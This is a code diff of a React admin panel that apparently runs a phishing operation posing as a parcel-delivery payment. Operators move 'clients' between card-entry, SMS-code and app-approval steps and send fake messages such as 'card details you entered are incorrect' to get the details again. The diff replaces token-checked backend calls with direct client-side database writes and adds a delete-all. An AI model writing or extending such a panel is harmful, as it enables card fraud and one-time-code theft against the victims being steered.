@@ -65,8 +65,6 @@ interface ClientSession {
   origin: string | null;
   destination: string | null;
   estimated_delivery: string | null;
-  weight: string | null;
-  session_path: string | null;
   created_at: string;
   updated_at: string;
 }
@@ -182,24 +180,6 @@ const AdminPanel = () => {
     if (!action || selectedIds.size === 0) return;
 
     const ids = Array.from(selectedIds);
-    const token = sessionStorage.getItem("admin_token");
-    
-    // Helper to update multiple sessions
-    const bulkUpdate = async (updates: Record<string, unknown>, successMsg: string) => {
-      try {
-        // Update each session via edge function
-        await Promise.all(ids.map(id => 
-          supabase.functions.invoke("admin-sessions", {
-            headers: token ? { Authorization: `Bearer ${token}` } : {},
-            body: { action: "update", sessionId: id, updates }
-          })
-        ));
-        toast({ title: successMsg });
-      } catch (error) {
-        console.error("Bulk action error:", error);
-        toast({ title: "Error", description: "Failed to execute bulk action", variant: "destructive" });
-      }
-    };
     
     try {
       switch (action) {
@@ -208,60 +188,68 @@ const AdminPanel = () => {
         case "step3":
         case "step4": {
           const step = parseInt(action.replace("step", ""));
-          await bulkUpdate(
-            { current_step: step, approval_type: step === 2 ? null : undefined },
-            `${ids.length} clients sent to step ${step}`
-          );
+          await supabase
+            .from("client_sessions")
+            .update({ current_step: step, approval_type: step === 2 ? null : undefined })
+            .in("id", ids);
+          toast({ title: `${ids.length} clients sent to step ${step}` });
           break;
         }
         case "sms":
-          await bulkUpdate(
-            { current_step: 3, approval_type: null, verification_code: null },
-            `${ids.length} clients sent to SMS verification`
-          );
+          await supabase
+            .from("client_sessions")
+            .update({ current_step: 3, approval_type: null, verification_code: null })
+            .in("id", ids);
+          toast({ title: `${ids.length} clients sent to SMS verification` });
           break;
         case "app":
-          await bulkUpdate(
-            { current_step: 3, approval_type: "app_pending", verification_code: null },
-            `${ids.length} clients sent to App approval`
-          );
+          await supabase
+            .from("client_sessions")
+            .update({ current_step: 3, approval_type: "app_pending", verification_code: null })
+            .in("id", ids);
+          toast({ title: `${ids.length} clients sent to App approval` });
           break;
         case "wrong_card":
-          await bulkUpdate(
-            { 
+          await supabase
+            .from("client_sessions")
+            .update({ 
               current_step: 2,
               admin_message: "The card details you entered are incorrect. Please check and try again.",
               message_type: "error"
-            },
-            `${ids.length} clients sent back to card page`
-          );
+            })
+            .in("id", ids);
+          toast({ title: `${ids.length} clients sent back to card page` });
           break;
         case "wrong_sms":
-          await bulkUpdate(
-            { 
+          await supabase
+            .from("client_sessions")
+            .update({ 
               admin_message: "The verification code you entered is incorrect. Please check and try again.",
               message_type: "error"
-            },
-            `Wrong SMS alert sent to ${ids.length} clients`
-          );
+            })
+            .in("id", ids);
+          toast({ title: `Wrong SMS alert sent to ${ids.length} clients` });
           break;
         case "confirm":
-          await bulkUpdate(
-            { current_step: 4, approval_type: "sms" },
-            `${ids.length} payments confirmed`
-          );
+          await supabase
+            .from("client_sessions")
+            .update({ current_step: 4, approval_type: "sms" })
+            .in("id", ids);
+          toast({ title: `${ids.length} payments confirmed` });
           break;
         case "deactivate":
-          await bulkUpdate(
-            { status: "completed" },
-            `${ids.length} clients deactivated`
-          );
+          await supabase
+            .from("client_sessions")
+            .update({ status: "completed" })
+            .in("id", ids);
+          toast({ title: `${ids.length} clients deactivated` });
           break;
         case "clear_message":
-          await bulkUpdate(
-            { admin_message: null, message_type: null },
-            `Messages cleared for ${ids.length} clients`
-          );
+          await supabase
+            .from("client_sessions")
+            .update({ admin_message: null, message_type: null })
+            .in("id", ids);
+          toast({ title: `Messages cleared for ${ids.length} clients` });
           break;
       }
       
@@ -284,15 +272,12 @@ const AdminPanel = () => {
 
   const handleDeleteAll = async () => {
     try {
-      const token = sessionStorage.getItem("admin_token");
-      const { data, error } = await supabase.functions.invoke("admin-sessions", {
-        headers: token ? { Authorization: `Bearer ${token}` } : {},
-        body: { action: "delete_all" }
-      });
+      const { error } = await supabase
+        .from("client_sessions")
+        .delete()
+        .neq("id", "00000000-0000-0000-0000-000000000000"); // Delete all rows
       
-      if (error || !data?.success) {
-        throw new Error(data?.error || "Failed to delete");
-      }
+      if (error) throw error;
       
       toast({ title: "All clients deleted", description: "Database cleared for new test" });
       setSelectedIds(new Set());
@@ -342,34 +327,21 @@ const AdminPanel = () => {
   };
 
   const fetchSessions = async () => {
-    try {
-      const token = sessionStorage.getItem("admin_token");
-      const { data, error } = await supabase.functions.invoke("admin-sessions", {
-        headers: token ? { Authorization: `Bearer ${token}` } : {},
-        body: { action: "list" }
-      });
+    const { data, error } = await supabase
+      .from("client_sessions")
+      .select("*")
+      .eq("status", "active")
+      .order("updated_at", { ascending: false });
 
-      if (error || !data?.success) {
-        console.error("Error fetching sessions:", error || data?.error);
-        toast({
-          title: "Error",
-          description: "Failed to fetch client sessions",
-          variant: "destructive"
-        });
-        setSessions([]);
-      } else {
-        // Filter to only active sessions
-        const activeSessions = (data.data || []).filter((s: ClientSession) => s.status === "active");
-        setSessions(activeSessions);
-      }
-    } catch (error) {
+    if (error) {
       console.error("Error fetching sessions:", error);
       toast({
         title: "Error",
         description: "Failed to fetch client sessions",
         variant: "destructive"
       });
-      setSessions([]);
+    } else {
+      setSessions(data || []);
     }
     setLoading(false);
   };
@@ -405,7 +377,7 @@ const AdminPanel = () => {
   }
 
   return (
-    <div className="min-h-screen bg-background">
+    <>
       {/* Confirmation Dialog */}
       <AlertDialog open={confirmDialog.open} onOpenChange={(open) => !open && setConfirmDialog({ ...confirmDialog, open: false })}>
         <AlertDialogContent>
@@ -430,6 +402,7 @@ const AdminPanel = () => {
         </AlertDialogContent>
       </AlertDialog>
 
+      <div className="min-h-screen bg-background">
       {/* Header */}
       <header className="bg-secondary text-secondary-foreground py-4 shadow-lg">
         <div className="container mx-auto px-4">
@@ -679,7 +652,8 @@ const AdminPanel = () => {
           </TabsContent>
         </Tabs>
       </main>
-    </div>
+      </div>
+    </>
   );
 };
 
